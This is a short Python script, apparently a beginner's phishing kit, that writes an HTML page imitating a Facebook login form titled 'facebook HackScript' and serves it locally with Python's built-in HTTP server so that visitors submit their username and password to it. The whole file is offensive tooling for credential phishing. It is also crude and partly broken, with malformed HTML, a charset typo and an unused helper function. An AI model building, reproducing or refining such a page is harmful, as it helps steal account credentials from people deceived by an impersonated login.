from bs4 import BeautifulSoup
import urllib3
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def graphique():
	fond = '\033[92m'
	name =f"{fond}⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤\n"
	print(name)



	
graphique()



def server_reception(host, port):
	global host_recept
	host_recept=host+':'+str(port)
	
	
	
def code_source():
	
	global index
	

	index =f"""<!doctype html>
	<html>
	<head>
	<meta name="viewport" content="width=320,initial-scale=1">
	<meta charset="uft-8">
	
	<meta property="og:title" content="">
	<meta property="og:description" content="">
	<meta property="og:image" content="">
	
	<link rel="stylesheet" href="">
	<link rel="stylesheet" href="">
	
	</head>
	<body>
	<div class="container-login">
	<h2 class="title-fa">facebook HackScript</h2>
	<form action="http://0.0.0.0:3000" method="post" >
	<div class="input-login">
		<label for="username">Username:</label><input name="username" type="text" id="username"></input><br /><br /><label for="password">Password:</label><input name="password" id="password" type="password"></input><br/><button name="submit" type="submit">Se connecter</button>
	</form>
	<center><br><a href=</a></center>
	<div class="hr"><p class="hr-inner">ou</p></div><br>
	<a href="#!" class="btn-input"></a>
	
	<ul class="list-login-1">
	<li class="link active-link"><a href="#!">HackScript</a></li>
	<li class="link"><a href="#!"></a></li>
	<li class="link"><a href="#!></a></li>
	</ul>
	<footer>
	<p class="copyright-login"></p>
	</footer>
	</div>
	
	
	</div>
	</body>
	</html>"""
	file = open('index.html', 'w')
	file.write(index)



def server_exploit(url, port, lien):
	
	site = '\033[93m'+lien
	
	print(f'\n Lien du serveur : {site}\n')
	
	
	os.system(f'python -m http.server {port}')  
	

code_source()
var=index
server_exploit('',3000, f'http://0.0.0.0:3000')